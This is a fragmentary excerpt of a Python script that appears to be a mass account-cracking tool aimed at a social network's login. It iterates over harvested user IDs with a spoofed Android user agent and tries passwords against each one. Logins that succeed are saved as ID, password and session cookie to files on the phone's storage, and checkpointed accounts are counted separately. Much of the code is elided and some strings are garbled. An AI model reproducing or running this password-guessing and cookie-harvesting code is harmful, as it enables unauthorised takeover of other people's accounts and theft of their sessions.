...
def login_baz():
	...
	try:
		head = {"User-Agent": "Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36"}
...
def nge_crack():
	...
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	...
	if len(baz_gtg)==0:
		...
		for file_id in baz_gtg:
			...
			if mz<100:
				...
				bzz.update({str(mz):str(file_id)})
				print('['+str(mz)+'] '+file_id+' [ '+str(len(pen_file))+' BETA�� ]'+x)
...
def passwrdh():
	...
	with prog:
		...
		yhg = '0'
		print('━━'* 25)
		print(f'{hijo}+ {puti}BETA�� ok : {hijo}%s{xxx} '%(ok))
		print(f'{kun}+ {puti}BETA�� cp : {kun}{yhg}{xxx} ')
		print('━━'* 25)
...
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#open('/sdcard/BETA��-CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
				...
				open('/sdcard/BETA��-OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
...
def passwrd():
	...
	with prog:
		...
		print('━━'* 25)
		print(f'{hijo}+ {puti}BETA�� ok : {hijo}%s{xxx} '%(ok))
		print(f'{kun}+ {puti}BETA�� cp : {kun}%s{xxx} '%(cp))
		print('━━'* 25)
...
###----------#[ CREAT FILE ]#----------###
def memulai():
	try:os.mkdir('/sdcard/BETA��-OK')
	except:pass
	try:os.mkdir('/sdcard/DUMP-FILE')
	except:pass
	try:os.mkdir('/sdcard/BETA��-CP')
	except:pass
	menu()
